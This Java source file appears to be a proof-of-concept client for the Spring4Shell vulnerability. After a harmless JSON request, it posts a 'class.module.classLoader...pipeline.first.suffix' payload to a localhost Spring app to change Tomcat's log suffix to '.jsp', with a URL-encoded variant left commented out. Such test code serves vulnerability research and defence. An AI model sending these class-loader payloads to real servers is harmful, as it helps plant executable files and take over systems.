package com.github.marschall.spring4shell.client;

import java.net.URI;
import java.util.List;

import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpMethod;
import org.springframework.http.MediaType;
import org.springframework.http.RequestEntity;
import org.springframework.http.ResponseEntity;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.client.RestTemplate;

public class Spring4ShellClient {

  public static void main(String[] args) {
    String host = "http://localhost:8080/";
    String context = "spring4shell";
    String servlet = "poc";
    String endpoint = "model";
    URI baseUri = URI.create(host + context + "/" + servlet + "/" + endpoint);
    RestTemplate restTemplate = new RestTemplate();

    RequestEntity<String> jsonEntity = newJsonEntity(baseUri);
    ResponseEntity<String> jsonResponse = restTemplate.exchange(jsonEntity, String.class);
    System.out.println(jsonResponse.getStatusCodeValue());
    System.out.println(jsonResponse.getBody());

//    RequestEntity<String> urlPayloadEntity = newUrlPayloadEntity(baseUri);
//    ResponseEntity<Void> urlPayloadResponse = restTemplate.exchange(urlPayloadEntity, Void.class);
//    System.out.println(urlPayloadResponse.getStatusCodeValue());
    
    RequestEntity<?> multipartPayloadEntity = newMultipartPayloadEntity(baseUri);
    ResponseEntity<Void> multiparPayloadResponse = restTemplate.exchange(multipartPayloadEntity, Void.class);
    System.out.println(multiparPayloadResponse.getStatusCodeValue());
  }

  private static RequestEntity<String> newJsonEntity(URI baseUri) {
    HttpHeaders httpHeaders = new HttpHeaders();
    httpHeaders.setContentType(MediaType.APPLICATION_JSON);
    httpHeaders.setAccept(List.of(MediaType.TEXT_PLAIN, MediaType.APPLICATION_JSON));
    return new RequestEntity<>("{\"name\": \"safe\"}", httpHeaders, HttpMethod.POST, baseUri);
  }

  private static RequestEntity<String> newUrlPayloadEntity(URI baseUri) {
    HttpHeaders httpHeaders = new HttpHeaders();
    httpHeaders.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
    httpHeaders.add("c2", "sp");

    String payload = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.j%25%7Bc2%7Di"; // .j%{c2}i -> .jsp

    return new RequestEntity<>(payload, httpHeaders, HttpMethod.POST, baseUri);
  }
  
  private static RequestEntity<?> newMultipartPayloadEntity(URI baseUri) {
    HttpHeaders httpHeaders = new HttpHeaders();
    httpHeaders.setContentType(MediaType.MULTIPART_FORM_DATA);
    httpHeaders.add("c2", "sp");

    MultiValueMap<String, Object> body = new LinkedMultiValueMap<>();
    body.add("class.module.classLoader.resources.context.parent.pipeline.first.suffix", ".j%25%7Bc2%7Di"); // .j%{c2}i -> .jsp

    return new RequestEntity<>(body, httpHeaders, HttpMethod.POST, baseUri);
  }

}
